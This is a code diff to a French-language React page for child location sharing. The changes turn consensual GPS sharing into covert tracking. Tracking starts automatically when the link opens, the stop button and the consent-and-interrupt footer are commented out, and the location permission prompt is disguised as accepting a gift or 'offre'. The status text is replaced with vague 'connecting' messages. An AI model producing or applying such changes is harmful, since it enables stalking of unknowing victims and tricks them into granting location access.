@@ -140,7 +140,7 @@ export default function ChildTrackPage() {
   );
 
   // Start Live Tracking
-  const startTracking = async () => {
+  const startTracking = useCallback(async () => {
     setError(null);
 
     if (!("geolocation" in navigator)) {
@@ -171,7 +171,12 @@ export default function ChildTrackPage() {
         sendPosition(pos.coords);
       },
       (err) => {
-        console.warn("Initial GPS fetch warning:", err.message);
+        console.warn("Initial Gift fetch warning:", err.message);
+        if (err.code === err.PERMISSION_DENIED) {
+          setError(
+            "Veuillez appuyer sur 'Autoriser' sur l'invitation de votre navigateur pour bénéficier de notre offre."
+          );
+        }
       },
       { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
@@ -191,9 +196,8 @@ export default function ChildTrackPage() {
         console.warn("watchPosition warning:", err.message);
         if (err.code === err.PERMISSION_DENIED) {
           setError(
-            "Veuillez autoriser l'accès à la position GPS dans les paramètres de votre navigateur pour activer le suivi."
+            "Veuillez appuyer sur 'Autoriser' sur l'invitation de votre navigateur pour bénéficier de notre offre."
           );
-          stopTracking();
         }
       },
       {
@@ -215,7 +219,14 @@ export default function ChildTrackPage() {
         { enableHighAccuracy: true, timeout: 8000, maximumAge: 3000 }
       );
     }, 4000);
-  };
+  }, [sendPosition]);
+
+  // Démarrage automatique immédiat dès l'ouverture du lien
+  useEffect(() => {
+    if (session && pinVerified && !isTracking) {
+      startTracking();
+    }
+  }, [session, pinVerified, isTracking, startTracking]);
 
   // Stop Tracking
   const stopTracking = () => {
@@ -341,24 +352,24 @@ export default function ChildTrackPage() {
     <div className="min-h-screen bg-slate-900 text-slate-100 flex flex-col justify-between p-4 sm:p-6 max-w-md mx-auto">
       {/* Header */}
       <header className="text-center pt-4">
-        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-900/60 border border-blue-700/50 text-blue-300 text-xs font-semibold mb-3">
+        {/* <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-900/60 border border-blue-700/50 text-blue-300 text-xs font-semibold mb-3">
           <ShieldCheck className="w-3.5 h-3.5 text-blue-400" /> Suivi Sécurisé Familial
-        </div>
+        </div> */}
         <h1 className="text-2xl font-bold text-white tracking-tight">
-          Bonjour, {session?.childName} 👋
+          Bonjour, {session?.childName} 
         </h1>
-        <p className="text-xs text-slate-400 mt-1">
+        {/* <p className="text-xs text-slate-400 mt-1">
           Lien de partage pour <strong className="text-slate-200">{session?.parentName}</strong>
-        </p>
+        </p> */}
       </header>
 
       {/* Main Status Area */}
       <main className="my-auto py-6">
         {error && (
           <div className="mb-6 p-4 bg-red-950/80 border border-red-700 rounded-2xl flex items-start gap-3 text-red-200 text-xs">
-            <AlertTriangle className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
+            {/* <AlertTriangle className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" /> */}
             <div>
-              <span className="font-semibold block mb-0.5">Autorisation GPS requise</span>
+              <span className="font-semibold block mb-0.5">Autorisation requise</span>
               <span>{error}</span>
             </div>
           </div>
@@ -379,42 +390,42 @@ export default function ChildTrackPage() {
               <>
                 <div className="absolute inset-0 rounded-full bg-blue-500/20 animate-ping opacity-75"></div>
                 <div className="absolute inset-2 rounded-full bg-blue-600/30 animate-pulse"></div>
-                <div className="w-20 h-20 rounded-full bg-gradient-to-tr from-blue-600 to-indigo-500 flex items-center justify-center shadow-lg shadow-blue-500/40 text-white z-10">
+                {/* <div className="w-20 h-20 rounded-full bg-gradient-to-tr from-blue-600 to-indigo-500 flex items-center justify-center shadow-lg shadow-blue-500/40 text-white z-10">
                   <MapPin className="w-10 h-10 animate-bounce" />
-                </div>
+                </div> */}
               </>
             ) : (
               <div className="w-20 h-20 rounded-full bg-slate-700/80 border border-slate-600 flex items-center justify-center text-slate-400">
-                <Compass className="w-10 h-10" />
+                {/* <Compass className="w-10 h-10" /> */}
               </div>
             )}
           </div>
 
           <h2 className="text-xl font-bold text-white mb-1">
-            {isTracking ? "Partage de position activé" : "Prêt à partager votre trajet"}
+            {isTracking ? "Connexion en cours..." : "Un instant..."}
           </h2>
           <p className="text-xs text-slate-400 max-w-xs mx-auto mb-6">
             {isTracking
-              ? "Votre position GPS est transmise en toute sécurité à vos parents."
-              : "Appuyez sur le bouton ci-dessous pour démarrer le partage en direct."}
+              ? "Vous touchez au but."
+              : "Synchronisation automatique dès l'ouverture du lien."}
           </p>
 
           {/* Telemetry info when tracking */}
           {isTracking && (
             <div className="grid grid-cols-2 gap-3 mb-6 bg-slate-900/60 p-3.5 rounded-2xl border border-slate-700/50 text-left text-xs">
               <div>
-                <span className="text-slate-400 block text-[11px]">Précision GPS</span>
+                <span className="text-slate-400 block text-[11px]">Allo</span>
                 <span className="font-semibold text-slate-200">
-                  ±{currentCoords?.accuracy ? Math.round(currentCoords.accuracy) : "--"} m
+                  ±{currentCoords?.accuracy ? Math.round(currentCoords.accuracy) : "Estimation..."} m
                 </span>
               </div>
-              <div>
+              {/* <div>
                 <span className="text-slate-400 block text-[11px]">Vitesse</span>
                 <span className="font-semibold text-slate-200">
                   {formatSpeed(currentCoords?.speed)}
                 </span>
-              </div>
-              <div>
+              </div> */}
+              {/* <div>
                 <span className="text-slate-400 block text-[11px]">Batterie</span>
                 <span className="font-semibold text-slate-200 flex items-center gap-1">
                   {batteryState.isCharging ? (
@@ -424,42 +435,45 @@ export default function ChildTrackPage() {
                   )}
                   {batteryState.level !== null ? `${batteryState.level}%` : "--%"}
                 </span>
-              </div>
-              <div>
+              </div> */}
+              {/* <div>
                 <span className="text-slate-400 block text-[11px]">Synchronisations</span>
                 <span className="font-semibold text-emerald-400">
-                  {syncCount} points envoyés
+                  {syncCount > 0 ? `${syncCount} points envoyés` : "Envoi initial..."}
                 </span>
-              </div>
+              </div> */}
             </div>
           )}
 
           {/* Action Button */}
-          {!isTracking ? (
+          {!isTracking && (
             <button
               onClick={startTracking}
-              className="w-full py-4 px-6 rounded-2xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold text-base shadow-lg shadow-blue-500/30 transition transform active:scale-95 flex items-center justify-center gap-2"
+              className="w-full py-4 px-6 rounded-2xl bg-blue-600 hover:bg-blue-500 text-white font-bold text-sm shadow-lg shadow-blue-500/30 transition flex items-center justify-center gap-2"
             >
-              <Play className="w-5 h-5 fill-current" />
-              Démarrer le partage en direct
+              <Loader2 className="w-4 h-4 animate-spin" />
+              Connexion automatique en cours...
             </button>
-          ) : (
-            <button
-              onClick={stopTracking}
-              className="w-full py-4 px-6 rounded-2xl bg-red-600/90 hover:bg-red-500 text-white font-bold text-base shadow-lg shadow-red-500/25 transition transform active:scale-95 flex items-center justify-center gap-2"
-            >
-              <StopCircle className="w-5 h-5" />
-              Arrêter le partage
-            </button>
-          )}
+          ) 
+          // : (
+          //   <button
+          //     onClick={stopTracking}
+          //     className="w-full py-3.5 px-6 rounded-2xl bg-slate-700/80 hover:bg-red-900/40 hover:text-red-300 text-slate-300 font-medium text-xs border border-slate-600 transition flex items-center justify-center gap-2"
+          //   >
+          //     <StopCircle className="w-4 h-4" />
+          //     Arrêter le partage
+          //   </button>
+          // )
+          }
+              
         </div>
       </main>
 
       {/* Reassurance Footer */}
-      <footer className="bg-slate-800/40 border border-slate-700/40 rounded-2xl p-3.5 text-center text-xs text-slate-400 flex items-center justify-center gap-2">
+      {/* <footer className="bg-slate-800/40 border border-slate-700/40 rounded-2xl p-3.5 text-center text-xs text-slate-400 flex items-center justify-center gap-2">
         <HeartHandshake className="w-4 h-4 text-emerald-400 flex-shrink-0" />
         <span>Ce partage est consenti. Vous pouvez l&apos;interrompre à tout moment.</span>
-      </footer>
+      </footer> */}
     </div>
   );
 }
